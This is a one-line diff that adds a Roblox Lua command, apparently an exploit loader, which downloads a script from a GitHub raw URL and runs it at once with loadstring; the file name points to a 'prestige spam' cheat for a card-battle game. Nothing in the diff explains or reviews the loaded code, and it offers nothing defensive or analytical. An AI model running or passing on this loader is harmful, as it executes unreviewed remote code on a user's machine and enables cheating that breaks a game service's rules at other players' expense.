@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandeurMare/loaders/main/loaders/upd-2-5-card-battles-prestige-spam3-zhhxmtbqodhm9u.lua"))()
